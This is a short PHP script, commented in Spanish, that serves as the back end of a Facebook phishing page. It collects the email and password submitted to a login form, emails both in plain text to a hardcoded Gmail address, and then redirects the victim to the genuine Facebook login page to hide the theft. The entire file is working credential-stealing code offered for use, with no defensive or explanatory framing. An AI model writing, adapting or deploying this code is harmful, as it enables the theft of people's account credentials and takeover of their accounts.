<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Recoge los datos del formulario
    $email = $_POST['email'];
    $contrasena = $_POST['contrasena'];
    
    // Dirección de correo electrónico a la que quieres enviar el formulario
    $destinatario = 'akrazou6@gmail.com'; // Cambia esto por tu dirección de correo electrónico
    
    // Asunto del correo electrónico
    $asunto = 'Nuevo inicio de sesión';
    
    // Contenido del correo electrónico
    $mensaje = "Se ha iniciado sesión con el siguiente correo electrónico: $email y la siguiente contraseña: $contrasena";
    
    // Cabeceras del correo electrónico
    $headers = 'From: tu@email.com' . "\r\n" .
        'Reply-To: tu@email.com' . "\r\n" .
        'X-Mailer: PHP/' . phpversion();
    
    // Envía el correo electrónico
    if (mail($destinatario, $asunto, $mensaje, $headers)) {
        // Redirige a la página de inicio de sesión de Facebook
        header('Location: https://es-es.facebook.com/login.php/');
    } else {
        // Si hay un error al enviar el correo electrónico, redirige a una página de error
        header('Location: error.html');
    }
} else {
    // Si se intenta acceder directamente a este archivo sin enviar el formulario, redirige a la página principal
    header('Location: index.html');
}
?>
